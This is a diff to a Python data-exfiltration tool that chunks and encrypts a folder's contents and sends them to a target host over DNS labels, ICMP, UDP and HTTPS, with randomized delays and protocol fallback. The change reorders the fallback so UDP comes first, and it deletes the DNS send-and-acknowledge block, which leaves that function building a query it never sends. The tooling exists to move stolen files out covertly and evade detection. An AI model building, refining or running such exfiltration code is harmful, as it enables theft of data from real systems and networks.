@@ -17,7 +17,7 @@ from Crypto.Random import get_random_bytes
 CHUNK_SIZE = 512  # Adjust as needed
 
 ICMP_PAYLOAD_SIZE_BYTES = 16
-ICMP_PAYLOAD_SIZE_HEX = ICMP_PAYLOAD_SIZE_BYTES * 2  # 112 hex characters
+ICMP_PAYLOAD_SIZE_HEX = ICMP_PAYLOAD_SIZE_BYTES * 2 
 
 DNS_MAX_PAYLOAD = 63  # DNS label size limit
 
@@ -129,23 +129,6 @@ def send_dns(target_domain, session_id, chunk_id, total_chunks, chunk, max_retri
         query = f"{session_id}.{chunk_id}.{total_chunks}.{part_id}.{total_parts}.{part}.{target_domain}"
         print(f"[DEBUG] Sending DNS query (length {len(query)}): {query}")
 
-        try:
-            response = resolver.resolve(query, "A")  # Send query
-
-            # Check if we got the acknowledgment (127.0.0.10)
-            for answer in response:
-                if answer.to_text() == "127.0.0.10":
-                    print(f"[+] ACK received for part {part_id+1}/{total_parts} of chunk {chunk_id}.")
-                    break
-            else:
-                print(f"[-] WARNING: No ACK for part {part_id+1}/{total_parts}. Retrying...")
-                continue  # Retry
-
-            break  # Break retry loop if ACK received
-
-        except Exception as e:
-            print(f"[-] DNS request failed for part {part_id}: {e}")
-
 
 
 def send_udp(target_ip, session_id, chunk_id, total_chunks, chunk):
@@ -177,13 +160,13 @@ def send_data(target_ip, folder_path, target_domain):
             print(f"[DEBUG] Attempt {attempts+1}/{MAX_TRIES}: Sleeping for {delay:.2f}s before sending chunk {chunk_id}")
 
             # Try sending via different protocols in order
-            if send_icmp(target_ip, session_id, chunk_id, total_chunks, chunk):
+            if send_udp(target_ip, session_id, chunk_id, total_chunks, chunk):
                 success = True
             elif send_https(target_ip, session_id, chunk_id, total_chunks, chunk):
                 success = True
             elif send_dns(target_domain, session_id, chunk_id, total_chunks, chunk):
                 success = True
-            elif send_udp(target_ip, session_id, chunk_id, total_chunks, chunk):
+            elif send_icmp(target_ip, session_id, chunk_id, total_chunks, chunk):
                 success = True
             
             attempts += 1
